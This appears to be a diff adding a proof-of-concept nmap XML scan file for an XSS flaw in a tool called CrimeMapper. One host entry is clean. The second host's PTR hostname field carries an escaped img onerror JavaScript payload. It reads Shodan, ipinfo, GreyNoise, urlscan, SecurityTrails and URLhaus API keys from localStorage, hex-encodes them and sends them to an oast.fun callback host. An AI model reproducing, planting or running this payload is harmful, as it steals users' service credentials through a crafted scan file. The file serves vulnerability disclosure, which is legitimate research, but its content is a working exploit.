@@ -1,0 +1,47 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE nmaprun>
+<!--
+  CrimeMapper XSS PoC - API Key Exfiltration (Hex Encoded)
+
+  Host 1: Clean scan result
+  Host 2: MALICIOUS - Exfiltrates API keys as hex
+
+  Exfil format: ?yoink=HEX(shodan:KEY,ipinfo:KEY,greynoise:KEY,...)
+  Target: dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun
+-->
+<nmaprun scanner="nmap" args="nmap -sV 10.0.0.0/24" start="1737100000" version="7.94">
+
+<!-- Normal host -->
+<host>
+  <status state="up"/>
+  <address addr="10.0.0.1" addrtype="ipv4"/>
+  <hostnames>
+    <hostname name="gateway" type="PTR"/>
+  </hostnames>
+  <ports>
+    <port protocol="tcp" portid="22">
+      <state state="open"/>
+      <service name="ssh" product="OpenSSH"/>
+    </port>
+  </ports>
+</host>
+
+<!-- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! -->
+<!-- MALICIOUS - EXFILTRATES API KEYS AS HEX       -->
+<!-- Format: ?yoink=shodan:KEY,ipinfo:KEY,...      -->
+<!-- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! -->
+<host>
+  <status state="up"/>
+  <address addr="10.0.0.99" addrtype="ipv4"/>
+  <hostnames>
+    <hostname name="&lt;img src=x onerror=&quot;(function(){var k={shodan:localStorage.getItem('shodanApiKey')||'',ipinfo:localStorage.getItem('ipinfoApiKey')||'',greynoise:localStorage.getItem('greynoiseApiKey')||'',urlscan:localStorage.getItem('urlscanApiKey')||'',securitytrails:localStorage.getItem('securitytrailsApiKey')||'',urlhaus:localStorage.getItem('urlhausApiKey')||''};var d=Object.entries(k).filter(function(e){return e[1]}).map(function(e){return e[0]+':'+e[1]}).join(',');var h=Array.from(d).map(function(c){return c.charCodeAt(0).toString(16).padStart(2,'0')}).join('');fetch('https://dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun?yoink='+h)})()&quot;&gt;" type="PTR"/>
+  </hostnames>
+  <ports>
+    <port protocol="tcp" portid="80">
+      <state state="open"/>
+      <service name="http"/>
+    </port>
+  </ports>
+</host>
+
+</nmaprun>
